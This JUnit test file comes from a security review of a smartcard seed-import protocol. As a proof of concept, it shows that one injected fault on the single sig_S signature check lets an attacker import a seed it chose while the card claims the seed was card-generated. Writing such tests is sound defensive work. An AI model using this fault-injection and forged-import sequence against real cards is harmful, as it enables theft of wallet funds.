// SPDX-FileCopyrightText: 2026 QuantX
// SPDX-License-Identifier: AGPL-3.0-or-later
package org.qntx.card.review;

import static org.junit.jupiter.api.Assertions.*;
import static org.qntx.card.review.ReviewHost.*;

import java.math.BigInteger;
import org.junit.jupiter.api.Test;
import org.qntx.card.review.ReviewSession.Inner;
import org.qntx.card.sim.Fault;

/**
 * PoC (review, finding R-05): IMPORT P1=0x00 verifies the sender's export signature {@code sig_S}
 * once (Transfer.java:295); §16.2 item 4 does not ask for a second evaluation of it. One laser that
 * makes that single verification report CHECK_OK — simulated by arming the woven {@code
 * Secp256k1.verifyHash} call site — lets an attacker run a whole import with no source card at all:
 * a genuine member certificate (public), an attacker-chosen E whose scalar it knows, 64 garbage
 * bytes as sig_S, and a payload it seals itself under Z = x(e·LK).
 *
 * <p>The point: without a fault a BLANK card can only be loaded with a host-known seed as origin =
 * imported (CREATE P1=0x01 or a real import). With one fault the card claims a card-generated seed
 * (origin = generated) that the attacker chose and knows.
 *
 * <p>The test asserts the faulty behaviour on the current code: with the fault armed both IMPORT
 * commands answer 9000 and VERIFY with the attacker's access hash reports origin = generated and
 * the master public key of the attacker's seed; without it IMPORT P1=0x00 is refused 6A80.
 */
final class SpofImportSourceTest {

    private static final byte[] ATK_SEED = unhex("A5".repeat(64));
    private static final byte[] ATK_HASH = sha256("review attacker access hash".getBytes());
    private static final byte[] GARBAGE_SIG = sha512("not a signature".getBytes());
    private static final short CHECK_OK = (short) 0x6666;

    private static final class Rig {
        ReviewCard c;
        ReviewSession s;
        FakeMember m;
        BigInteger e; // the attacker's scalar behind E — it knows it
        byte[] epk; // E = e·G, uncompressed
        byte[] lkT; // the target's offered link public key
    }

    /** BLANK target that has answered OFFER; the attacker plays the source itself. */
    private static Rig rig() {
        Rig r = new Rig();
        r.c = ReviewCard.uninitialised();
        r.c.blank();
        r.m = new FakeMember(ReviewCard.CA); // genuine member cert: CA-signed, public
        r.s = r.c.open();
        Inner of = r.s.cmd((byte) 0x40, (byte) 0, (byte) 0, new byte[0]);
        assertEquals(0x9000, of.sw, "OFFER");
        r.lkT = slice(of.data, 0, 65);
        r.e = randomScalar();
        r.epk = uncomp(g().multiply(r.e));
        return r;
    }

    /** cert_S ‖ E ‖ 64 garbage bytes — a head only the sig_S check can reject. */
    private static byte[] import0Command(Rig r) {
        return concat(r.m.cert, r.epk, GARBAGE_SIG);
    }

    @Test
    void controlWithoutFault() {
        Rig r = rig();
        try {
            Inner i0 = r.s.cmd((byte) 0x42, (byte) 0x00, (byte) 0, import0Command(r));
            assertEquals(0x6A80, i0.sw, "control: garbage sig_S must be refused 6A80");
        } finally {
            Fault.reset();
        }
    }

    @Test
    void attackerInstalledSeedByOneVerifyHashFault() {
        Rig r = rig();
        try {
            // dry run: the refused request performs two verifyHash calls — cert_S (call 1)
            // then sig_S (call 2) — before answering 6A80, so call 2 is the sig_S check
            Fault.countCalls();
            Inner refused = r.s.cmd((byte) 0x42, (byte) 0x00, (byte) 0, import0Command(r));
            assertEquals(0x6A80, refused.sw, "dry run: garbage sig_S refused");
            int calls = Fault.calls("Secp256k1.verifyHash");
            assertEquals(2, calls, "the sig_S check must be verifyHash call 2, saw " + calls);
            Fault.reset();

            Fault.arm("Secp256k1.verifyHash", 2, CHECK_OK);
            Inner i0 = r.s.cmd((byte) 0x42, (byte) 0x00, (byte) 0, import0Command(r));
            Fault.reset();
            assertEquals(
                    0x9000,
                    i0.sw,
                    "one verifyHash fault must pass the garbage sig_S (observed "
                            + String.format("%04X", i0.sw)
                            + ")");

            // the attacker knows e: Z = x(e·LK_T) gives it K_te ‖ K_tm for a payload it
            // seals itself — an attacker-known seed with origin byte = generated
            byte[] z = ecdhX(r.e, r.lkT);
            byte[] exportM = concat(LABEL_EXPORT, r.m.a, r.s.cardA, r.lkT, r.epk);
            byte[] payload =
                    concat(
                            new byte[] {0x01},
                            ATK_SEED,
                            ATK_HASH,
                            new byte[] {0x02},
                            cardId(r.s.cardA),
                            r.m.cardId);
            byte[] record = FakeMember.sealRecord(z, exportM, payload)[0];
            Inner i1 = r.s.cmd((byte) 0x42, (byte) 0x01, (byte) 0, record);
            assertEquals(0x9000, i1.sw, "IMPORT P1=0x01");

            // the card now holds the attacker's seed and says the card generated it
            Inner v = r.s.cmd((byte) 0x22, (byte) 0, (byte) 0, ATK_HASH);
            assertEquals(0x9000, v.sw, "VERIFY with the attacker's access hash");
            assertEquals(0x01, v.data[33] & 0xFF, "origin = generated");
            byte[] expectedMpk = compr(g().multiply(b2i(bip32Master(ATK_SEED)[0])));
            assertArrayEquals(
                    expectedMpk, slice(v.data, 0, 33), "master public key of the attacker's seed");
        } finally {
            Fault.reset();
        }
    }
}
